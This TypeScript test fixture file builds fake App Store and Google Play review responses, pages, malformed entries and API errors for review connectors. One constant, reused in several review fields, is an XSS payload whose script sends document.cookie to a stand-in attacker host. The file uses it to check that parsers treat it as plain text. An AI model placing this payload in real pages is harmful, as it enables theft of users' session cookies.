import { APPLE_BASE } from './store.fixtures.ts';

/**
 * Hand-written fixtures for the review connectors, shaped after Apple's and Google's reference
 * pages (listed in appstore-reviews.ts and play-reviews.ts). They are NOT recordings of live
 * traffic. The review texts are test data, some of them shaped like attacks on purpose: a
 * parser must keep them as plain text and never act on them.
 */

export const APP_ID = '682658836';
export const REVIEWS_PATH = `/v1/apps/${APP_ID}/customerReviews`;
export const PLAY_PACKAGE = 'com.example.coffee';

export const XSS = '<img src=x onerror=alert(1)><script>fetch("//evil.example/?c="+document.cookie)</script>';

// ---------------------------------------------------------------------------------------------
// App Store Connect

export const appleReview = (
  id: string,
  rating: number,
  createdDate: string,
  extra: { title?: string | null; body?: string | null; nickname?: string; territory?: string; response?: string } = {},
) => ({
  type: 'customerReviews',
  id,
  attributes: {
    rating,
    title: extra.title === undefined ? `Title ${id}` : extra.title,
    body: extra.body === undefined ? `Body ${id}` : extra.body,
    reviewerNickname: extra.nickname ?? 'Anne Johnson',
    createdDate,
    territory: extra.territory ?? 'USA',
  },
  relationships: {
    response: {
      ...(extra.response ? { data: { type: 'customerReviewResponses', id: `resp-${id}` } } : {}),
      links: {
        self: `${APPLE_BASE}/v1/customerReviews/${id}/relationships/response`,
        related: `${APPLE_BASE}/v1/customerReviews/${id}/response`,
      },
    },
  },
  links: { self: `${APPLE_BASE}/v1/customerReviews/${id}` },
});

export const appleResponse = (id: string, body: string, state = 'PUBLISHED', lastModifiedDate = '2026-11-16T09:00:00-08:00') => ({
  type: 'customerReviewResponses',
  id: `resp-${id}`,
  attributes: { responseBody: body, lastModifiedDate, state },
});

/** Two pages, newest first, the second linked by a cursor. Page 1 carries a developer response. */
export const applePage1 = {
  data: [
    appleReview('00000030-0000-0000-0000-000000000001', 1, '2026-11-17T10:00:00-08:00', {
      title: 'Crashes on launch',
      body: 'Opens and closes again. Useless since the update.',
      nickname: 'Pat',
      response: 'Sorry about that, please update to 2.4.1.',
    }),
    appleReview('00000030-0000-0000-0000-000000000002', 5, '2026-11-16T10:00:00-08:00', { title: 'Great', body: 'Love it', territory: 'GBR' }),
  ],
  included: [appleResponse('00000030-0000-0000-0000-000000000001', 'Sorry about that, please update to 2.4.1.')],
  links: {
    self: `${APPLE_BASE}${REVIEWS_PATH}?limit=2&sort=-createdDate&include=response`,
    next: `${APPLE_BASE}${REVIEWS_PATH}?cursor=AQ.AMt2C-U&include=response&limit=2&sort=-createdDate`,
  },
  meta: { paging: { total: 4, limit: 2 } },
};

export const applePage2 = {
  data: [
    appleReview('00000030-0000-0000-0000-000000000003', 3, '2026-10-01T10:00:00-07:00', { title: 'Ok', body: 'Fine.' }),
    appleReview('00000030-0000-0000-0000-000000000004', 2, '2026-09-01T10:00:00-07:00', { title: XSS, body: XSS, nickname: '<b>Bold</b>' }),
  ],
  links: { self: `${APPLE_BASE}${REVIEWS_PATH}?cursor=AQ.AMt2C-U&limit=2` },
  meta: { paging: { total: 4, limit: 2 } },
};

/** Partial, odd and unknown content: only the first entry is usable. */
export const applePartial = {
  data: [
    { type: 'customerReviews', id: 'ok-1', attributes: { rating: '4', createdDate: '2026-11-01T00:00:00Z', somethingNew: { nested: true } }, extraTop: 1 },
    { type: 'customerReviews', id: 'no-rating', attributes: { createdDate: '2026-11-01T00:00:00Z' } },
    { type: 'customerReviews', id: 'bad-rating', attributes: { rating: 9, createdDate: '2026-11-01T00:00:00Z' } },
    { type: 'customerReviews', id: 'no-date', attributes: { rating: 3 } },
    { type: 'customerReviews', attributes: { rating: 3, createdDate: '2026-11-01T00:00:00Z' } },
    { type: 'somethingElse', id: 'x', attributes: { rating: 3, createdDate: '2026-11-01T00:00:00Z' } },
    'not an object',
    null,
  ],
};

export const appleSummarizations = {
  data: [
    {
      type: 'customerReviewSummarizations',
      id: 's1',
      attributes: { text: 'Users like the speed; some report crashes after login.', locale: 'en-US', platform: 'IOS', territory: 'USA', createdDate: '2026-11-10T00:00:00Z' },
    },
    { type: 'customerReviewSummarizations', id: 's2', attributes: { platform: 'IOS' } },
  ],
};

export const appleErrors = {
  forbidden: {
    errors: [
      {
        id: 'e1',
        status: '403',
        code: 'FORBIDDEN_ERROR',
        title: 'This request is forbidden for security reasons',
        detail: 'The API key in use does not allow this request',
      },
    ],
  },
  notFound: { errors: [{ id: 'e2', status: '404', code: 'NOT_FOUND', title: 'The specified resource does not exist' }] },
  rateLimited: { errors: [{ id: 'e3', status: '429', code: 'RATE_LIMIT_EXCEEDED', title: 'Rate limit exceeded' }] },
};

// ---------------------------------------------------------------------------------------------
// Google Play

export const playTimestamp = (iso: string, nanos = 0) => ({ seconds: String(Math.floor(Date.parse(iso) / 1000)), nanos });

export const playReview = (
  id: string,
  stars: number,
  iso: string,
  extra: {
    text?: string;
    author?: string;
    language?: string;
    versionName?: string;
    versionCode?: number | string;
    device?: string;
    reply?: { text: string; iso: string };
    originalText?: string;
  } = {},
) => ({
  reviewId: id,
  authorName: extra.author ?? 'A Google user',
  comments: [
    {
      userComment: {
        text: extra.text ?? `Comment of ${id}`,
        lastModified: playTimestamp(iso),
        starRating: stars,
        reviewerLanguage: extra.language ?? 'en_US',
        device: extra.device ?? 'klte',
        androidOsVersion: 29,
        appVersionCode: extra.versionCode ?? 240,
        appVersionName: extra.versionName ?? '2.4.0',
        thumbsUpCount: 2,
        thumbsDownCount: 0,
        deviceMetadata: { productName: 'Galaxy S5', manufacturer: 'Samsung' },
        ...(extra.originalText !== undefined ? { originalText: extra.originalText } : {}),
      },
    },
    ...(extra.reply
      ? [{ developerComment: { text: extra.reply.text, lastModified: playTimestamp(extra.reply.iso) } }]
      : []),
  ],
});

export const playPage1 = {
  reviews: [
    playReview('gp:AOqpTOE1', 1, '2026-11-17T10:00:00Z', {
      text: 'Broken\tThe app crashes when I open the camera.',
      author: 'Sam',
      reply: { text: 'Thanks, a fix is coming.', iso: '2026-11-17T12:00:00Z' },
    }),
    playReview('gp:AOqpTOE2', 5, '2026-11-16T10:00:00Z', { text: 'Perfect', versionName: '2.3.9', versionCode: '239', language: 'de' }),
  ],
  tokenPagination: { nextPageToken: 'TOKEN-2' },
  pageInfo: { totalResults: 3, resultPerPage: 2, startIndex: 0 },
};

export const playPage2 = {
  reviews: [playReview('gp:AOqpTOE3', 3, '2026-11-13T10:00:00Z', { text: XSS, author: '<script>x</script>' })],
  pageInfo: { totalResults: 3, resultPerPage: 2, startIndex: 2 },
};

export const playPartial = {
  reviews: [
    { reviewId: 'ok', comments: [{ userComment: { text: 'fine', starRating: 4, lastModified: { seconds: '1731900000' }, surprise: true } }] },
    { reviewId: 'no-comments', comments: [] },
    { reviewId: 'only-developer', comments: [{ developerComment: { text: 'hi', lastModified: { seconds: '1731900000' } } }] },
    { reviewId: 'no-rating', comments: [{ userComment: { text: 'x', lastModified: { seconds: '1731900000' } } }] },
    { reviewId: 'bad-time', comments: [{ userComment: { text: 'x', starRating: 3, lastModified: { seconds: 'soon' } } }] },
    { comments: [{ userComment: { text: 'x', starRating: 3, lastModified: { seconds: '1731900000' } } }] },
    42,
  ],
};

export const playTranslated = playReview('gp:TR1', 2, '2026-11-15T10:00:00Z', {
  text: 'Slow\tThe app is slow',
  originalText: 'Lent\tL’application est lente',
  language: 'fr',
});

export const playErrors = {
  forbidden: { error: { code: 403, message: 'The caller does not have permission', errors: [{ reason: 'forbidden' }], status: 'PERMISSION_DENIED' } },
  quota: { error: { code: 429, message: 'Quota exceeded', errors: [{ reason: 'rateLimitExceeded' }] } },
  notFound: { error: { code: 404, message: 'Package not found: com.example.coffee.' } },
};

// ---------------------------------------------------------------------------------------------
// iTunes lookup

export const itunesLookup = {
  resultCount: 1,
  results: [
    {
      trackId: Number(APP_ID),
      trackName: 'Coffee',
      averageUserRating: 4.52346,
      userRatingCount: 12873,
      averageUserRatingForCurrentVersion: 4.1,
      userRatingCountForCurrentVersion: 210,
      trackViewUrl: 'https://apps.apple.com/us/app/coffee/id682658836',
      unknownThing: { a: 1 },
    },
  ],
};
